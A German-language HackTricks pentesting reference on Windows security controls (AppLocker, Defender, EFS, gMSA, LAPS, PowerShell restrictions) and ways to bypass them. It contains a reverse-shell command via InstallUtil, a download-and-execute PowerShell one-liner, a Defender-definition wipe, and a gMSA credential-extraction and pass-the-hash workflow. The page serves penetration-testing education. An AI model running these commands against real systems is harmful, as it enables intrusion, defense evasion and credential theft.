# Windows-Sicherheitskontrollen

{{#include ../../banners/hacktricks-training.md}}

## AppLocker-Richtlinie

Eine application whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, deren Vorhandensein und Ausführung auf einem System erlaubt ist. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen geschäftlichen Anforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **application whitelisting solution** und gibt Systemadministratoren Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Es bietet **granulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installer-Dateien, DLLs, gepackte Apps und Installer für gepackte Apps.\
Es ist üblich, dass Organisationen **cmd.exe und PowerShell.exe blockieren** und den Schreibzugriff auf bestimmte Verzeichnisse sperren, **aber dies kann vollständig umgangen werden**.

### Überprüfen

Überprüfe, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Dieser Registrierungspfad enthält die von AppLocker angewendeten Konfigurationen und Richtlinien und ermöglicht die Überprüfung der aktuell auf dem System durchgesetzten Regeln:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **beschreibbare Ordner**, um die AppLocker-Richtlinie zu umgehen: Wenn AppLocker die Ausführung beliebiger Dateien innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **beschreibbare Ordner**, die du verwenden kannst, um dies zu **umgehen**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Häufig **vertrauenswürdige** [**„LOLBAS's“**](https://lolbas-project.github.io/) Binaries können ebenfalls nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln können ebenfalls umgangen werden**
- Bei **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** kannst du beispielsweise überall einen **Ordner namens `allowed`** erstellen, und er wird zugelassen.
- Organisationen konzentrieren sich außerdem häufig darauf, die ausführbare Datei **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu **blockieren**, vergessen aber die **anderen** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **DLL enforcement** ist aufgrund der zusätzlichen Belastung, die dadurch auf einem System entstehen kann, und des erforderlichen Testaufwands, um sicherzustellen, dass nichts beschädigt wird, nur sehr selten aktiviert. Die Verwendung von **DLLs als Backdoors hilft daher dabei, AppLocker zu umgehen**.
- Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess **auszuführen** und AppLocker zu umgehen. Weitere Informationen findest du unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Speicherung von Credentials

### Security Accounts Manager (SAM)

Lokale Credentials befinden sich in dieser Datei, die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Credentials** (gehasht) werden aus Gründen des Single Sign-On im **Speicher** dieses Subsystems **gespeichert**.\
**LSA** verwaltet die lokale **security policy** (Passwort-Richtlinie, Benutzerberechtigungen ...), **authentication**, **access tokens** ...\
LSA ist dafür zuständig, die im **SAM**-File bereitgestellten **Credentials** (bei einem lokalen Login) zu **überprüfen** und mit dem **domain controller** zu **kommunizieren**, um einen Domain-Benutzer zu authentifizieren.

Die **Credentials** werden im **Prozess LSASS** **gespeichert**: Kerberos-Tickets, NT- und LM-Hashes sowie leicht entschlüsselbare Passwörter.

### LSA secrets

LSA kann einige Credentials auf der Festplatte speichern:

- Passwort des Computerkontos von Active Directory (nicht erreichbarer domain controller).
- Passwörter der Konten von Windows-Diensten
- Passwörter für scheduled tasks
- Mehr (Passwort von IIS-Anwendungen ...)

### NTDS.dit

Dies ist die Datenbank von Active Directory. Sie ist nur auf Domain Controllern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirusprogramm, das in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Es **blockiert** häufig verwendete pentesting tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, diese **Schutzmaßnahmen zu umgehen**.

### Überprüfung

Um den **Status** von **Defender** zu überprüfen, kannst du das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (überprüfe den Wert von **`RealTimeProtectionEnabled`**, um festzustellen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Um es zu enumerieren, kannst du auch Folgendes ausführen:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Verschlüsseltes Dateisystem (EFS)

EFS schützt Dateien durch Verschlüsselung und verwendet dabei einen **symmetrischen Schlüssel**, der als **File Encryption Key (FEK)** bekannt ist. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im **alternativen Datenstrom** $EFS der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Datenstrom zu entschlüsseln. Weitere Informationen finden Sie [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Entschlüsselungsszenarien ohne Initiierung durch den Benutzer** umfassen:

- Wenn Dateien oder Ordner in ein Nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) verschoben werden, werden sie automatisch entschlüsselt.
- Über das Netzwerk mittels SMB/CIFS-Protokoll gesendete verschlüsselte Dateien werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht dem Besitzer einen **transparenten Zugriff** auf verschlüsselte Dateien. Das einfache Ändern des Passworts des Besitzers und anschließende Anmelden ermöglicht jedoch keine Entschlüsselung.

**Wichtige Erkenntnisse**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt wird.
- Für die Entschlüsselung wird der private Schlüssel des Benutzers verwendet, um auf den FEK zuzugreifen.
- Unter bestimmten Bedingungen, beispielsweise beim Kopieren nach FAT32 oder bei der Netzwerkübertragung, erfolgt eine automatische Entschlüsselung.
- Der Besitzer kann ohne zusätzliche Schritte auf verschlüsselte Dateien zugreifen.

### EFS-Informationen überprüfen

Überprüfe, ob ein **Benutzer** diesen **Dienst** **verwendet**, indem du prüfst, ob dieser Pfad existiert:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Überprüfe mit cipher /c \<file>\, **wer** Zugriff auf die Datei hat.  
Du kannst außerdem `cipher /e` und `cipher /d` innerhalb eines Ordners verwenden, um alle Dateien zu **verschlüsseln** und zu **entschlüsseln**.

### EFS-Dateien entschlüsseln

#### Als Authority System

Diese Methode erfordert, dass der **Opferbenutzer** einen **Prozess** innerhalb des Hosts **ausführt**. Wenn dies der Fall ist, kannst du mit einer `meterpreter`-Sitzung das Token des Prozesses des Benutzers imitieren (`impersonate_token` aus `incognito`). Alternativ kannst du einfach per `migrate` in den Prozess des Benutzers wechseln.

#### Das Passwort des Benutzers kennen


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Gruppenverwaltete Dienstkonten (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Dienstkonten, bei denen häufig die Einstellung "**Password never expire**" aktiviert ist, bieten gMSAs eine sicherere und besser verwaltbare Lösung:

- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes Passwort mit 240 Zeichen, das sich entsprechend der Domänen- oder Computerrichtlinie automatisch ändert. Dieser Prozess wird vom Microsoft Key Distribution Service (KDC) verwaltet, wodurch manuelle Passwortaktualisierungen entfallen.
- **Erhöhte Sicherheit**: Diese Konten sind vor Sperrungen geschützt und können nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
- **Unterstützung mehrerer Hosts**: gMSAs können von mehreren Hosts gemeinsam verwendet werden und eignen sich daher ideal für Dienste, die auf mehreren Servern ausgeführt werden.
- **Unterstützung geplanter Tasks**: Im Gegensatz zu Managed Service Accounts unterstützen gMSAs die Ausführung geplanter Tasks.
- **Vereinfachte SPN-Verwaltung**: Das System aktualisiert automatisch den Service Principal Name (SPN), wenn sich die sAMaccount-Details oder der DNS-Name des Computers ändern, wodurch die SPN-Verwaltung vereinfacht wird.

Die Passwörter für gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und von Domain Controllern (DCs) alle 30 Tage automatisch zurückgesetzt. Dieses Passwort, ein verschlüsseltes Datenobjekt namens [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern abgerufen werden, auf denen die gMSAs installiert sind, wodurch eine sichere Umgebung gewährleistet wird. Für den Zugriff auf diese Informationen ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit 'Sealing & Secure' authentifiziert werden.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Du kannst dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> lesen.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Weitere Informationen in diesem Beitrag**](https://cube0x0.github.io/Relaying-for-gMSA/)

Siehe auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/) darüber, wie ein **NTLM relay attack** durchgeführt wird, um das **Passwort** eines **gMSA** zu **lesen**.<sup>[[1]](#references)</sup>

### ACL chaining ausnutzen, um das verwaltete Passwort eines gMSA zu lesen (GenericAll -> ReadGMSAPassword)

In vielen Umgebungen können Benutzer mit geringen Berechtigungen ohne einen DC-Kompromiss auf gMSA-Secrets zugreifen, indem sie falsch konfigurierte Objekt-ACLs ausnutzen:<sup>[[3]](#references)</sup>

- Einer kontrollierbaren Gruppe (z. B. über GenericAll/GenericWrite) wird `ReadGMSAPassword` für einen gMSA gewährt.
- Indem du dich selbst zu dieser Gruppe hinzufügst, erbst du das Recht, den `msDS-ManagedPassword`-Blob des gMSA über LDAP zu lesen und nutzbare NTLM-Credentials abzuleiten.

Typischer Ablauf:

1) Ermittle den Pfad mit BloodHound und markiere deine Foothold-Principals als Owned. Suche nach Edges wie:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Füge dich selbst zur kontrollierten Zwischen-Gruppe hinzu (Beispiel mit bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Lies das von gMSA verwaltete Passwort über LDAP aus und leite den NTLM-Hash ab. NetExec automatisiert das Auslesen von `msDS-ManagedPassword` und die Konvertierung in NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Als gMSA mit dem NTLM-Hash authentifizieren (kein Klartext erforderlich). Wenn sich das Konto in der Gruppe Remote Management Users befindet, funktioniert WinRM direkt:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Hinweise:
- LDAP-Lesezugriffe auf `msDS-ManagedPassword` erfordern Sealing (z. B. LDAPS/Sign+Seal). Tools übernehmen dies automatisch.
- gMSAs werden häufig lokale Rechte wie WinRM gewährt. Überprüfe die Gruppenmitgliedschaft (z. B. Remote Management Users), um laterale Bewegungen zu planen.
- Wenn du den Blob nur benötigst, um den NTLM selbst zu berechnen, siehe die Struktur MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

Die **Local Administrator Password Solution (LAPS)**, die bei [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) zum Download verfügbar ist, ermöglicht die Verwaltung lokaler Administratorpasswörter. Diese Passwörter, die **randomisiert**, eindeutig und **regelmäßig geändert** werden, werden zentral in Active Directory gespeichert. Der Zugriff auf diese Passwörter wird durch ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen wird das Lesen lokaler Adminpasswörter ermöglicht.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Der PowerShell-[**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der Funktionen ein**, die für eine effektive Nutzung von PowerShell erforderlich sind, z. B. durch das Blockieren von COM-Objekten und die Beschränkung auf genehmigte .NET-Typen, XAML-basierte Workflows, PowerShell-Klassen und mehr.

### **Prüfen**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Umgehen
```bash
#Easy bypass
Powershell -version 2
```
In aktuellen Windows-Versionen funktioniert dieser Bypass nicht, aber du kannst [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Zum Kompilieren musst du möglicherweise** **eine Referenz hinzufügen** (_**Add a Reference**_) -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und **das Projekt auf .Net4.5 ändern**.

#### Direkter Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess auszuführen und den Constrained Mode zu umgehen. Weitere Informationen findest du unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** gesetzt. Die wichtigsten Möglichkeiten, diese Richtlinie zu umgehen:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More ist [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> zu finden

## Security Support Provider Interface (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Die SSPI ist dafür zuständig, das geeignete Protokoll für zwei kommunizierende Computer zu finden. Die bevorzugte Methode dafür ist Kerberos. Anschließend handelt die SSPI aus, welches Authentifizierungsprotokoll verwendet wird. Diese Authentifizierungsprotokolle werden Security Support Provider (SSP) genannt, befinden sich in Form einer DLL auf jedem Windows-Computer, und beide Computer müssen dasselbe Protokoll unterstützen, um miteinander kommunizieren zu können.

### Main SSPs

- **Kerberos**: Das bevorzugte Protokoll
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
- %windir%\Windows\System32\lsasrv.dll

#### Die Aushandlung kann mehrere Methoden oder nur eine anbieten.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für Aktivitäten mit erhöhten Rechten** ermöglicht.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
